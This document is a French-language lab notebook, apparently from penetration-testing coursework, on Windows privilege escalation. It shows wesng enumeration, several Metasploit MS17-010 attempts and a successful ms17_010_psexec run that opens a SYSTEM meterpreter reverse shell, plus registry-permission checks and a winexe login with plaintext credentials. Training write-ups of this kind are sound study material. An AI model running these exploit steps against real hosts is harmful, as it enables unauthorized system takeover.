
## Kernel exploits

1.
```cmd
C:\Users\nabil> systeminfo | findstr /I version
OS Version:                10.0.14393 N/A Build 14393
BIOS Version:              SeaBIOS rel-1.16.1-0-g3208b098f51a-prebuilt.qemu.org, 4/1/2014

C:\Users\nabil> ver
Microsoft Windows [Version 10.0.14393]
```

2.
Goggle Dorking --> site:exploit-db.com cve python 14393

EDB-ID: 42315
CVE: 2017-0144

Non seulement ce script python n'explique pas explicitement les paramètres et/ou arguments du script à modifier et en plus de cela, malgré m'être ajouté au groupe "Administrators" depuis une session Administrator (et j'ai bien redémarré ma session pour que les changements prennent effet), je n'arrive pas à installer python sur ma machine!

Du coup à l'aide de Metasploit, nous pouvons déterminer que la vulnérabilité qui nous permettra d'élever nos privilèges est:
```
MS17-010 --> RCE (Remote Code Execution)
```

3. -
4. -
5. -

PrivEsc à l'aide de Metasploit:

```bash
$ git clone https://github.com/bitsadmin/wesng --depth 1                                                                 
$ ls                                                                             msfadmin_ssh_key  pspy32  wesng

$ cd wesng/                                                                                                              
$ ls                                                                        
CHANGELOG.md  collector        demo.gif     missingkbs.vbs  README.md  validation
CMDLINE.md    definitions.zip  LICENSE.txt  muc_lookup.py   setup.py   wes.py

$ ./wes.py --update

$ python wes.py ../systeminfo.txt -i 'Elevation of Privilege' --exploits-only | cat
Windows Exploit Suggester 1.03 ( https://github.com/bitsadmin/wesng/ )
[+] Parsing systeminfo output
...

Date: 20161108
CVE: CVE-2016-7255
...

Date: 20161108
CVE: CVE-2016-7226
...

Date: 20161108
CVE: CVE-2016-7225
...

Date: 20161108
CVE: CVE-2016-7224
...

# aucune des CVE ne fait référence à un script python (plutôt à des scripts C Sharp)

$ msfconsole                                                                                                                 
msf6 > search 14393

Matching Modules
================

   #  Name                                  Disclosure Date  Rank  Check  Description
   -  ----                                  ---------------  ----  -----  -----------
   0  exploit/windows/local/cve_2021_40449  2021-10-12       good  Yes    Win32k NtGdiResetDC Use After Free Local Privilege Elevation


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/cve_2021_40449

msf6 > use 0

msf6 exploit(windows/local/cve_2021_40449) > show info

msf6 exploit(windows/local/cve_2021_40449) > show options

msf6 exploit(windows/local/cve_2021_40449) > set session 1
session => 1

msf6 exploit(windows/local/cve_2021_40449) > set LHOST 192.168.149.15
LHOST => 192.168.149.15

msf6 exploit(windows/local/cve_2021_40449) > run
[-] Msf::OptionValidateError The following options failed to validate: SESSION
[*] Exploit completed, but no session was created.

msf6 exploit(windows/local/cve_2021_40449) > set session 2
session => 2

msf6 exploit(windows/local/cve_2021_40449) > run
[-] Msf::OptionValidateError The following options failed to validate: SESSION
[*] Exploit completed, but no session was created.

msf6 exploit(windows/local/cve_2021_40449) > back

msf6 exploit(windows/local/cve_2021_40449) > run
[-] Msf::OptionValidateError The following options failed to validate: SESSION

msf6 exploit(windows/local/cve_2021_40449) > back

msf6 > search cve-2017-0144

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > show info

msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.11.1.116
RHOST => 10.11.1.116

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.149.15
LHOST => 192.168.149.15

msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 192.168.149.15:4444 
...
[*] Exploit completed, but no session was created.

msf6 exploit(windows/smb/ms17_010_eternalblue) > back 

msf6 > use 1

msf6 auxiliary(scanner/smb/smb_ms17_010) > show info

msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 10.11.1.116
RHOST => 10.11.1.116

msf6 auxiliary(scanner/smb/smb_ms17_010) > run
[+] 10.11.1.116:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Datacenter Evaluation 14393 x64 (64-bit)
[*] 10.11.1.116:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf6 auxiliary(scanner/smb/smb_ms17_010) > back 

msf6 > use 2
[*] Using configured payload windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/smb_doublepulsar_rce) > show info

msf6 exploit(windows/smb/smb_doublepulsar_rce) > show options

msf6 exploit(windows/smb/smb_doublepulsar_rce) > set RHOST 10.11.1.116
RHOST => 10.11.1.116

msf6 exploit(windows/smb/smb_doublepulsar_rce) > set LHOST 192.168.149.15
LHOST => 192.168.149.15
 
msf6 exploit(windows/smb/smb_doublepulsar_rce) > run
[*] Started reverse TCP handler on 192.168.149.15:4444 
[-] 10.11.1.116:445 - Exploit aborted due to failure: bad-config: 
...
[*] Exploit completed, but no session was created.

msf6 exploit(windows/smb/smb_doublepulsar_rce) > back

msf6 > search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/smb/smb_ms17_010

## L'exploit numéro 0 a déjà été exploité en vain plus haut!

msf6 > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_psexec) > show info

msf6 exploit(windows/smb/ms17_010_psexec) > show options

msf6 exploit(windows/smb/ms17_010_psexec) > set RHOST 10.11.1.116
RHOST => 10.11.1.116

msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 192.168.149.15
LHOST => 192.168.149.15

msf6 exploit(windows/smb/ms17_010_psexec) > run
[*] Started reverse TCP handler on 192.168.149.15:4444 
[*] 10.11.1.116:445 - Target OS: Windows Server 2016 Datacenter Evaluation 14393
[*] 10.11.1.116:445 - Built a write-what-where primitive...
[+] 10.11.1.116:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.11.1.116:445 - Selecting PowerShell target
[*] 10.11.1.116:445 - Executing the payload...
[+] 10.11.1.116:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.11.1.116
[*] Meterpreter session 1 opened (192.168.149.15:4444 -> 10.11.1.116:52620) at 2023-10-08 20:36:38 +0200

meterpreter > shell
Process 5252 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>exit
exit
meterpreter > exit
```


La suite des exercices s'est déroulée sans problème si ce n'est :

## Weak Registry Permissions

3.Alternatively accesschk.exe can be used to confirm:
```cmd
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

Error opening svc registry key --> Acces is denied contradictoire au fait que j'appartienne entre autre au groupe NT AUTHORITY/INTERACTIVE et que quand je fais 
```powershell
PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
```
il apparait entre autres 
```
NT AUTORITHY\INTERACTIVE Allow FullControl
```


## Registry

4.On Kali, we can use the winexe command to spawn a shell using these credentials:
```bash
winexe -U 'admin%password123' //10.0.1.48 cmd.ex
```
output: NT_STATUS_PASSWORD_EXPIRED
